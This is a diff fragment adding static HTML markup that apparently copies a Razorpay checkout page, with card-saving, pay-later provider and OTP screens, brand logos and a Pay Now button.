+                                                            </div>
+                                                        </div>
+                                                        <div class="row remember-check svelte-1vprt24">
+                                                            <div>
+                                                                <div class="svelte-1b61qmd"><label
+                                                                        class="first save_card_label_text svelte-1b61qmd"
+                                                                        for="save" id="should-save-card" tabindex="0">
+                                                                        <div class="save-card-container svelte-1b61qmd">
+                                                                            <div><input type="checkbox"
+                                                                                    class="checkbox--square" id="save"
+                                                                                    name="save"> <span
+                                                                                    class="checkbox svelte-1b61qmd"></span>
+                                                                            </div>
+                                                                            <div class="label-container svelte-1b61qmd">
+                                                                                <span
+                                                                                    class="saved-card-text svelte-1b61qmd">Save
+                                                                                    card securely for future payments
+                                                                                </span></div>
+                                                                        </div>
+                                                                    </label> <span
+                                                                        class="know-more-text svelte-1b61qmd know-more-text-add-card"><span
+                                                                            class="cusor-pointer svelte-1b61qmd">Know
+                                                                            More</span></span></div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div id="accountTab" class="account-tab svelte-1gzjpgx">
+                                                <div class="separator svelte-1gzjpgx"></div>
+                                                <div class="account-tab-container svelte-1gzjpgx">
+                                                    <div class="account-wrapper svelte-1gzjpgx no-foh">
+                                                        <div class="d-flex align-center svelte-1gzjpgx">
+                                                            <div data-test-id="account-tab-btn"
+                                                                class="account-section svelte-1gzjpgx">Account <span
+                                                                    class="account-toggle-icon svelte-1gzjpgx"> <svg
+                                                                        width="10" height="6" fill="none"
+                                                                        xmlns="http://www.w3.org/2000/svg">
+                                                                        <path
+                                                                            d="M.187 5.028 4.897.284l4.71 4.744-.688.688-4.022-4.057L.875 5.716l-.688-.688Z"
+                                                                            fill="#171a1e"></path>
+                                                                    </svg></span></div>
+                                                        </div>
+                                                        <div class="rzp-icon-section rzp-row svelte-13in3zh"><span
+                                                                class="brand-text-row brand-text-content svelte-13in3zh">
+                                                                Secured by</span> <svg width="72" height="16"
+                                                                viewBox="0 0 72 16" fill="none"
+                                                                xmlns="http://www.w3.org/2000/svg">
+                                                                <g clip-path="url(#a)">
+                                                                    <path
+                                                                        d="M4.857 4.48 4.26 6.633l3.413-2.165-2.232 8.168 2.267.002L11.006.574"
+                                                                        fill="#3395FF"></path>
+                                                                    <path
+                                                                        d="m1.183 9.204-.939 3.433h4.647l1.901-6.985-5.609 3.552ZM17.324 6.18c-.113.414-.332.718-.659.912-.325.194-.782.291-1.372.291H13.42l.658-2.406h1.874c.59 0 .994.097 1.214.293.22.197.272.498.16.914V6.18Zm1.94-.048c.24-.869.14-1.537-.295-2.005-.436-.464-1.2-.698-2.29-.698h-4.183l-2.518 9.212h2.032l1.015-3.713h1.333c.299 0 .534.048.706.14.173.097.274.264.305.506l.363 3.067h2.177l-.353-2.86c-.072-.638-.37-1.013-.894-1.124.668-.19 1.227-.505 1.677-.944.448-.434.768-.98.926-1.578v-.003Zm4.94 3.211c-.17.624-.431 1.096-.785 1.426-.353.33-.776.494-1.269.494-.502 0-.842-.16-1.022-.483-.18-.323-.186-.79-.019-1.403s.434-1.092.801-1.437a1.822 1.822 0 0 1 1.29-.518c.492 0 .83.167 1 .499.174.333.178.81.007 1.43l-.003-.008Zm.89-3.26-.254.932a1.481 1.481 0 0 0-.638-.802c-.316-.196-.706-.297-1.172-.297a3.37 3.37 0 0 0-1.647.435c-.526.29-.988.698-1.382 1.225a5.343 5.343 0 0 0-.867 1.797c-.182.676-.22 1.266-.11 1.779.113.516.352.91.72 1.184.37.279.844.416 1.423.416.46.002.915-.095 1.333-.286.412-.183.78-.451 1.075-.787l-.265.971h1.965l1.794-6.563H25.1l-.005-.003Zm9.036 0h-5.714l-.4 1.463h3.326l-4.396 3.724-.376 1.374h5.899l.4-1.463h-3.563l4.463-3.78.361-1.317Zm5.03 3.25c-.176.645-.439 1.131-.785 1.447a1.79 1.79 0 0 1-1.259.48c-1.03 0-1.368-.643-1.017-1.928.174-.638.438-1.118.79-1.442a1.821 1.821 0 0 1 1.28-.486c.493 0 .825.16.996.484.171.323.17.805-.005 1.444Zm1.15-3.003c-.452-.276-1.03-.414-1.733-.414-.713 0-1.373.137-1.98.412a4.271 4.271 0 0 0-1.553 1.19 4.777 4.777 0 0 0-.925 1.812c-.185.688-.208 1.293-.064 1.81.144.516.447.913.901 1.188.458.277 1.041.415 1.757.415a4.65 4.65 0 0 0 1.961-.415 4.315 4.315 0 0 0 1.545-1.192 4.79 4.79 0 0 0 .924-1.812c.19-.69.212-1.294.068-1.812a1.97 1.97 0 0 0-.894-1.19l-.006.008Zm7.016 1.507.503-1.786c-.17-.086-.394-.13-.674-.13a2.82 2.82 0 0 0-2.219 1.115l.262-.961-.57.002h-1.402l-1.806 6.56h1.993l.937-3.43c.136-.498.382-.89.736-1.169.352-.28.791-.42 1.321-.42.326 0 .629.074.916.22l.003-.001Zm5.544 1.527c-.17.612-.428 1.08-.78 1.403a1.808 1.808 0 0 1-1.268.487c-.492 0-.83-.164-1.007-.49-.182-.329-.186-.802-.015-1.425.17-.622.431-1.099.79-1.43a1.82 1.82 0 0 1 1.277-.498c.484 0 .81.17.984.516.174.345.178.824.01 1.436h.01Zm1.385-3.023c-.37-.29-.84-.434-1.412-.434-.501 0-.979.111-1.431.336a2.97 2.97 0 0 0-1.102.919l.007-.045.334-1.043h-1.946l-.496 1.815-.015.064-2.045 7.479h1.996l1.03-3.765c.102.335.31.598.628.788.318.19.71.283 1.177.283.58 0 1.133-.137 1.657-.412.526-.275.98-.672 1.367-1.184a5.19 5.19 0 0 0 .855-1.779c.186-.673.224-1.273.118-1.799-.108-.526-.347-.933-.716-1.221l-.006-.002Zm6.619 2.996c-.17.62-.432 1.095-.784 1.422a1.794 1.794 0 0 1-1.268.493c-.504 0-.845-.16-1.023-.483-.181-.323-.185-.79-.019-1.403.167-.613.433-1.092.8-1.437a1.822 1.822 0 0 1 1.29-.518c.492 0 .825.167 1 .498.174.331.175.808.005 1.43l-.001-.002Zm.89-3.262-.255.932a1.468 1.468 0 0 0-.636-.802c-.319-.198-.709-.297-1.174-.297-.572 0-1.124.145-1.65.435a4.32 4.32 0 0 0-1.383 1.221 5.33 5.33 0 0 0-.867 1.797c-.184.675-.22 1.266-.11 1.78.111.513.35.91.72 1.185.368.275.844.414 1.423.414.466 0 .91-.095 1.333-.286a3.112 3.112 0 0 0 1.073-.788l-.265.972h1.965l1.793-6.56h-1.965l-.003-.003Zm10.217.003.001-.002h-1.207l-.108.002h-.627l-.322.438-.08.104-.033.052-2.547 3.479-.526-4.073h-2.085l1.056 6.189-2.332 3.167h2.078l.565-.785a.86.86 0 0 1 .049-.066l.659-.917.018-.026 2.951-4.103 2.487-3.453.004-.002v-.004Z"
+                                                                        fill="#0C2651"></path>
+                                                                </g>
+                                                                <defs>
+                                                                    <clipPath id="a">
+                                                                        <path fill="#fff"
+                                                                            transform="translate(.214 .537)"
+                                                                            d="M0 0h71.786v14.926H0z"></path>
+                                                                    </clipPath>
+                                                                </defs>
+                                                            </svg></div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="shadow shadow-top svelte-btdjlc"></div>
+                                        <div class="shadow shadow-bottom svelte-btdjlc"></div>
+                                    </div>
+                                    <div id="form-paylater"
+                                        class="tab-content showable screen svelte-1unl8xe tab-content-one-cc">
+                                        <div class="paylater-container svelte-vrseyb">
+                                            <div class="paylater-wrapper svelte-vrseyb screen-one-cc">
+                                                <div><input type="hidden" name="provider"> <input type="hidden"
+                                                        name="ott">
+                                                    <h3 class="paylater-header svelte-vrseyb">Select an option</h3>
+                                                    <div class="options paylater-section svelte-vrseyb">
+                                                        <div class="option next-option " tabindex="0"
+                                                            data-paylater="epaylater">
+                                                            <div class="option-icon"> <img
+                                                                    src="https://cdn.razorpay.com/paylater-sq/epaylater.svg"
+                                                                    alt=""></div>
+                                                            <div class="option-title svelte-1eakaw">
+                                                                <div>ePayLater</div>
+                                                            </div>
+                                                        </div>
+                                                        <div class="option next-option " tabindex="0"
+                                                            data-paylater="getsimpl">
+                                                            <div class="option-icon"> <img
+                                                                    src="https://cdn.razorpay.com/paylater-sq/getsimpl.svg"
+                                                                    alt=""></div>
+                                                            <div class="option-title svelte-1eakaw">
+                                                                <div>Simpl</div>
+                                                            </div>
+                                                        </div>
+                                                        <div class="option next-option " tabindex="0"
+                                                            data-paylater="icic">
+                                                            <div class="option-icon"> <img
+                                                                    src="https://cdn.razorpay.com/paylater-sq/icic.svg"
+                                                                    alt=""></div>
+                                                            <div class="option-title svelte-1eakaw">
+                                                                <div>ICICI Bank PayLater</div>
+                                                            </div>
+                                                        </div>
+                                                        <div class="option next-option " tabindex="0"
+                                                            data-paylater="kkbk">
+                                                            <div class="option-icon"> <img
+                                                                    src="https://cdn.razorpay.com/paylater-sq/kkbk.svg"
+                                                                    alt=""></div>
+                                                            <div class="option-title svelte-1eakaw">
+                                                                <div>Kotak Mahindra Bank</div>
+                                                            </div>
+                                                        </div>
+                                                        <div class="option next-option " tabindex="0"
+                                                            data-paylater="lazypay">
+                                                            <div class="option-icon"> <img
+                                                                    src="https://cdn.razorpay.com/paylater-sq/lazypay.svg"
+                                                                    alt=""></div>
+                                                            <div class="option-title svelte-1eakaw">
+                                                                <div>LazyPay</div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div id="accountTab" class="account-tab svelte-1gzjpgx">
+                                                <div class="separator svelte-1gzjpgx"></div>
+                                                <div class="account-tab-container svelte-1gzjpgx">
+                                                    <div class="account-wrapper svelte-1gzjpgx no-foh">
+                                                        <div class="d-flex align-center svelte-1gzjpgx">
+                                                            <div data-test-id="account-tab-btn"
+                                                                class="account-section svelte-1gzjpgx">Account <span
+                                                                    class="account-toggle-icon svelte-1gzjpgx"> <svg
+                                                                        width="10" height="6" fill="none"
+                                                                        xmlns="http://www.w3.org/2000/svg">
+                                                                        <path
+                                                                            d="M.187 5.028 4.897.284l4.71 4.744-.688.688-4.022-4.057L.875 5.716l-.688-.688Z"
+                                                                            fill="#171a1e"></path>
+                                                                    </svg></span></div>
+                                                        </div>
+                                                        <div class="rzp-icon-section rzp-row svelte-13in3zh"><span
+                                                                class="brand-text-row brand-text-content svelte-13in3zh">
+                                                                Secured by</span> <svg width="72" height="16"
+                                                                viewBox="0 0 72 16" fill="none"
+                                                                xmlns="http://www.w3.org/2000/svg">
+                                                                <g clip-path="url(#a)">
+                                                                    <path
+                                                                        d="M4.857 4.48 4.26 6.633l3.413-2.165-2.232 8.168 2.267.002L11.006.574"
+                                                                        fill="#3395FF"></path>
+                                                                    <path
+                                                                        d="m1.183 9.204-.939 3.433h4.647l1.901-6.985-5.609 3.552ZM17.324 6.18c-.113.414-.332.718-.659.912-.325.194-.782.291-1.372.291H13.42l.658-2.406h1.874c.59 0 .994.097 1.214.293.22.197.272.498.16.914V6.18Zm1.94-.048c.24-.869.14-1.537-.295-2.005-.436-.464-1.2-.698-2.29-.698h-4.183l-2.518 9.212h2.032l1.015-3.713h1.333c.299 0 .534.048.706.14.173.097.274.264.305.506l.363 3.067h2.177l-.353-2.86c-.072-.638-.37-1.013-.894-1.124.668-.19 1.227-.505 1.677-.944.448-.434.768-.98.926-1.578v-.003Zm4.94 3.211c-.17.624-.431 1.096-.785 1.426-.353.33-.776.494-1.269.494-.502 0-.842-.16-1.022-.483-.18-.323-.186-.79-.019-1.403s.434-1.092.801-1.437a1.822 1.822 0 0 1 1.29-.518c.492 0 .83.167 1 .499.174.333.178.81.007 1.43l-.003-.008Zm.89-3.26-.254.932a1.481 1.481 0 0 0-.638-.802c-.316-.196-.706-.297-1.172-.297a3.37 3.37 0 0 0-1.647.435c-.526.29-.988.698-1.382 1.225a5.343 5.343 0 0 0-.867 1.797c-.182.676-.22 1.266-.11 1.779.113.516.352.91.72 1.184.37.279.844.416 1.423.416.46.002.915-.095 1.333-.286.412-.183.78-.451 1.075-.787l-.265.971h1.965l1.794-6.563H25.1l-.005-.003Zm9.036 0h-5.714l-.4 1.463h3.326l-4.396 3.724-.376 1.374h5.899l.4-1.463h-3.563l4.463-3.78.361-1.317Zm5.03 3.25c-.176.645-.439 1.131-.785 1.447a1.79 1.79 0 0 1-1.259.48c-1.03 0-1.368-.643-1.017-1.928.174-.638.438-1.118.79-1.442a1.821 1.821 0 0 1 1.28-.486c.493 0 .825.16.996.484.171.323.17.805-.005 1.444Zm1.15-3.003c-.452-.276-1.03-.414-1.733-.414-.713 0-1.373.137-1.98.412a4.271 4.271 0 0 0-1.553 1.19 4.777 4.777 0 0 0-.925 1.812c-.185.688-.208 1.293-.064 1.81.144.516.447.913.901 1.188.458.277 1.041.415 1.757.415a4.65 4.65 0 0 0 1.961-.415 4.315 4.315 0 0 0 1.545-1.192 4.79 4.79 0 0 0 .924-1.812c.19-.69.212-1.294.068-1.812a1.97 1.97 0 0 0-.894-1.19l-.006.008Zm7.016 1.507.503-1.786c-.17-.086-.394-.13-.674-.13a2.82 2.82 0 0 0-2.219 1.115l.262-.961-.57.002h-1.402l-1.806 6.56h1.993l.937-3.43c.136-.498.382-.89.736-1.169.352-.28.791-.42 1.321-.42.326 0 .629.074.916.22l.003-.001Zm5.544 1.527c-.17.612-.428 1.08-.78 1.403a1.808 1.808 0 0 1-1.268.487c-.492 0-.83-.164-1.007-.49-.182-.329-.186-.802-.015-1.425.17-.622.431-1.099.79-1.43a1.82 1.82 0 0 1 1.277-.498c.484 0 .81.17.984.516.174.345.178.824.01 1.436h.01Zm1.385-3.023c-.37-.29-.84-.434-1.412-.434-.501 0-.979.111-1.431.336a2.97 2.97 0 0 0-1.102.919l.007-.045.334-1.043h-1.946l-.496 1.815-.015.064-2.045 7.479h1.996l1.03-3.765c.102.335.31.598.628.788.318.19.71.283 1.177.283.58 0 1.133-.137 1.657-.412.526-.275.98-.672 1.367-1.184a5.19 5.19 0 0 0 .855-1.779c.186-.673.224-1.273.118-1.799-.108-.526-.347-.933-.716-1.221l-.006-.002Zm6.619 2.996c-.17.62-.432 1.095-.784 1.422a1.794 1.794 0 0 1-1.268.493c-.504 0-.845-.16-1.023-.483-.181-.323-.185-.79-.019-1.403.167-.613.433-1.092.8-1.437a1.822 1.822 0 0 1 1.29-.518c.492 0 .825.167 1 .498.174.331.175.808.005 1.43l-.001-.002Zm.89-3.262-.255.932a1.468 1.468 0 0 0-.636-.802c-.319-.198-.709-.297-1.174-.297-.572 0-1.124.145-1.65.435a4.32 4.32 0 0 0-1.383 1.221 5.33 5.33 0 0 0-.867 1.797c-.184.675-.22 1.266-.11 1.78.111.513.35.91.72 1.185.368.275.844.414 1.423.414.466 0 .91-.095 1.333-.286a3.112 3.112 0 0 0 1.073-.788l-.265.972h1.965l1.793-6.56h-1.965l-.003-.003Zm10.217.003.001-.002h-1.207l-.108.002h-.627l-.322.438-.08.104-.033.052-2.547 3.479-.526-4.073h-2.085l1.056 6.189-2.332 3.167h2.078l.565-.785a.86.86 0 0 1 .049-.066l.659-.917.018-.026 2.951-4.103 2.487-3.453.004-.002v-.004Z"
+                                                                        fill="#0C2651"></path>
+                                                                </g>
+                                                                <defs>
+                                                                    <clipPath id="a">
+                                                                        <path fill="#fff"
+                                                                            transform="translate(.214 .537)"
+                                                                            d="M0 0h71.786v14.926H0z"></path>
+                                                                    </clipPath>
+                                                                </defs>
+                                                            </svg></div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div id="form-otp"
+                                        class="tab-content screen svelte-hev61 showable tab-content-one-cc loading"
+                                        style="display: none;" data-hidden="true">
+                                        <div class="otp-screen-contents svelte-hev61 heading-1cc otp-wrapper-1cc">
+                                            <div class="otp-controls svelte-hev61 otp-controls-one-cc is-loading">
+                                                <div id="otp-prompt" class="svelte-hev61 otp-header">
+                                                    <div class="async-loading loading svelte-dp3m1g"
+                                                        data-testid="async-loader">
+                                                        <div class="message svelte-dp3m1g">Looking for saved cards
+                                                            associated with +919000090000</div>
+                                                        <div class="spin">
+                                                            <div></div>
+                                                        </div>
+                                                        <div class="spin spin2">
+                                                            <div></div>
+                                                        </div> <span class="link"></span>
+                                                    </div>
+                                                </div>
+                                                <div id="otp-section">
+                                                    <div id="otp-elem" class="theme-border-color svelte-hev61 hidden"
+                                                        style="width: 100%;">
+                                                        <div class="help svelte-hev61">Please enter the OTP</div> <input
+                                                            type="tel" class="input svelte-hev61" name="otp" id="otp"
+                                                            pattern="[0-9]" maxlength="6" autocomplete="off"
+                                                            required="">
+                                                    </div>
+                                                </div>
+                                                <div id="otp-sec-outer" class="svelte-hev61">
+                                                    <div
+                                                        class="otp-action-container svelte-hev61 action-native-otp with-two-action">
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div id="accountTab" class="account-tab svelte-1gzjpgx">
+                                            <div class="separator svelte-1gzjpgx"></div>
+                                            <div class="account-tab-container svelte-1gzjpgx">
+                                                <div class="account-wrapper svelte-1gzjpgx no-foh">
+                                                    <div class="d-flex align-center svelte-1gzjpgx">
+                                                        <div data-test-id="account-tab-btn"
+                                                            class="account-section svelte-1gzjpgx">Account <span
+                                                                class="account-toggle-icon svelte-1gzjpgx"> <svg
+                                                                    width="10" height="6" fill="none"
+                                                                    xmlns="http://www.w3.org/2000/svg">
+                                                                    <path
+                                                                        d="M.187 5.028 4.897.284l4.71 4.744-.688.688-4.022-4.057L.875 5.716l-.688-.688Z"
+                                                                        fill="#171a1e"></path>
+                                                                </svg></span></div>
+                                                    </div>
+                                                    <div class="rzp-icon-section rzp-row svelte-13in3zh"><span
+                                                            class="brand-text-row brand-text-content svelte-13in3zh">
+                                                            Secured by</span> <svg width="72" height="16"
+                                                            viewBox="0 0 72 16" fill="none"
+                                                            xmlns="http://www.w3.org/2000/svg">
+                                                            <g clip-path="url(#a)">
+                                                                <path
+                                                                    d="M4.857 4.48 4.26 6.633l3.413-2.165-2.232 8.168 2.267.002L11.006.574"
+                                                                    fill="#3395FF"></path>
+                                                                <path
+                                                                    d="m1.183 9.204-.939 3.433h4.647l1.901-6.985-5.609 3.552ZM17.324 6.18c-.113.414-.332.718-.659.912-.325.194-.782.291-1.372.291H13.42l.658-2.406h1.874c.59 0 .994.097 1.214.293.22.197.272.498.16.914V6.18Zm1.94-.048c.24-.869.14-1.537-.295-2.005-.436-.464-1.2-.698-2.29-.698h-4.183l-2.518 9.212h2.032l1.015-3.713h1.333c.299 0 .534.048.706.14.173.097.274.264.305.506l.363 3.067h2.177l-.353-2.86c-.072-.638-.37-1.013-.894-1.124.668-.19 1.227-.505 1.677-.944.448-.434.768-.98.926-1.578v-.003Zm4.94 3.211c-.17.624-.431 1.096-.785 1.426-.353.33-.776.494-1.269.494-.502 0-.842-.16-1.022-.483-.18-.323-.186-.79-.019-1.403s.434-1.092.801-1.437a1.822 1.822 0 0 1 1.29-.518c.492 0 .83.167 1 .499.174.333.178.81.007 1.43l-.003-.008Zm.89-3.26-.254.932a1.481 1.481 0 0 0-.638-.802c-.316-.196-.706-.297-1.172-.297a3.37 3.37 0 0 0-1.647.435c-.526.29-.988.698-1.382 1.225a5.343 5.343 0 0 0-.867 1.797c-.182.676-.22 1.266-.11 1.779.113.516.352.91.72 1.184.37.279.844.416 1.423.416.46.002.915-.095 1.333-.286.412-.183.78-.451 1.075-.787l-.265.971h1.965l1.794-6.563H25.1l-.005-.003Zm9.036 0h-5.714l-.4 1.463h3.326l-4.396 3.724-.376 1.374h5.899l.4-1.463h-3.563l4.463-3.78.361-1.317Zm5.03 3.25c-.176.645-.439 1.131-.785 1.447a1.79 1.79 0 0 1-1.259.48c-1.03 0-1.368-.643-1.017-1.928.174-.638.438-1.118.79-1.442a1.821 1.821 0 0 1 1.28-.486c.493 0 .825.16.996.484.171.323.17.805-.005 1.444Zm1.15-3.003c-.452-.276-1.03-.414-1.733-.414-.713 0-1.373.137-1.98.412a4.271 4.271 0 0 0-1.553 1.19 4.777 4.777 0 0 0-.925 1.812c-.185.688-.208 1.293-.064 1.81.144.516.447.913.901 1.188.458.277 1.041.415 1.757.415a4.65 4.65 0 0 0 1.961-.415 4.315 4.315 0 0 0 1.545-1.192 4.79 4.79 0 0 0 .924-1.812c.19-.69.212-1.294.068-1.812a1.97 1.97 0 0 0-.894-1.19l-.006.008Zm7.016 1.507.503-1.786c-.17-.086-.394-.13-.674-.13a2.82 2.82 0 0 0-2.219 1.115l.262-.961-.57.002h-1.402l-1.806 6.56h1.993l.937-3.43c.136-.498.382-.89.736-1.169.352-.28.791-.42 1.321-.42.326 0 .629.074.916.22l.003-.001Zm5.544 1.527c-.17.612-.428 1.08-.78 1.403a1.808 1.808 0 0 1-1.268.487c-.492 0-.83-.164-1.007-.49-.182-.329-.186-.802-.015-1.425.17-.622.431-1.099.79-1.43a1.82 1.82 0 0 1 1.277-.498c.484 0 .81.17.984.516.174.345.178.824.01 1.436h.01Zm1.385-3.023c-.37-.29-.84-.434-1.412-.434-.501 0-.979.111-1.431.336a2.97 2.97 0 0 0-1.102.919l.007-.045.334-1.043h-1.946l-.496 1.815-.015.064-2.045 7.479h1.996l1.03-3.765c.102.335.31.598.628.788.318.19.71.283 1.177.283.58 0 1.133-.137 1.657-.412.526-.275.98-.672 1.367-1.184a5.19 5.19 0 0 0 .855-1.779c.186-.673.224-1.273.118-1.799-.108-.526-.347-.933-.716-1.221l-.006-.002Zm6.619 2.996c-.17.62-.432 1.095-.784 1.422a1.794 1.794 0 0 1-1.268.493c-.504 0-.845-.16-1.023-.483-.181-.323-.185-.79-.019-1.403.167-.613.433-1.092.8-1.437a1.822 1.822 0 0 1 1.29-.518c.492 0 .825.167 1 .498.174.331.175.808.005 1.43l-.001-.002Zm.89-3.262-.255.932a1.468 1.468 0 0 0-.636-.802c-.319-.198-.709-.297-1.174-.297-.572 0-1.124.145-1.65.435a4.32 4.32 0 0 0-1.383 1.221 5.33 5.33 0 0 0-.867 1.797c-.184.675-.22 1.266-.11 1.78.111.513.35.91.72 1.185.368.275.844.414 1.423.414.466 0 .91-.095 1.333-.286a3.112 3.112 0 0 0 1.073-.788l-.265.972h1.965l1.793-6.56h-1.965l-.003-.003Zm10.217.003.001-.002h-1.207l-.108.002h-.627l-.322.438-.08.104-.033.052-2.547 3.479-.526-4.073h-2.085l1.056 6.189-2.332 3.167h2.078l.565-.785a.86.86 0 0 1 .049-.066l.659-.917.018-.026 2.951-4.103 2.487-3.453.004-.002v-.004Z"
+                                                                    fill="#0C2651"></path>
+                                                            </g>
+                                                            <defs>
+                                                                <clipPath id="a">
+                                                                    <path fill="#fff" transform="translate(.214 .537)"
+                                                                        d="M0 0h71.786v14.926H0z"></path>
+                                                                </clipPath>
+                                                            </defs>
+                                                        </svg></div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div id="bottom">
+                                        <div class="bottom svelte-6yu4s" tab="common"> </div>
+                                        <div class="bottom svelte-6yu4s" tab="card"> </div>
+                                    </div>
+                                </div>
+                                <div id="toast" class="svelte-gk8k86"></div>
+                                <div class="cta-container svelte-13mgn3i with-amount">
+                                    <div class="flex-column svelte-13mgn3i"> <span class="price-label svelte-13mgn3i">₹
+                                            500</span> <button type="button" id="cta-view-details"
+                                            data-test-id="cta-view-details" class="svelte-13mgn3i">View Details</button>
+                                    </div>
+                                    <div class="redesign-v15-cta-wrapper svelte-13mgn3i"><button id="redesign-v15-cta"
+                                            class="svelte-13mgn3i">Pay Now</button></div>
+                                </div>
+                                <div id="redesign-v15-footer"></div> <button type="submit"></button>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div><i id="powered-by" class="powered-one-cc"><a href="https://razorpay.com?ref=org-in-chk"
+                    target="_blank" tabindex="-1"></a></i>
+        </div>
+    </body>
+
+    </html>
+</body>
+kkkk
+
+</html>
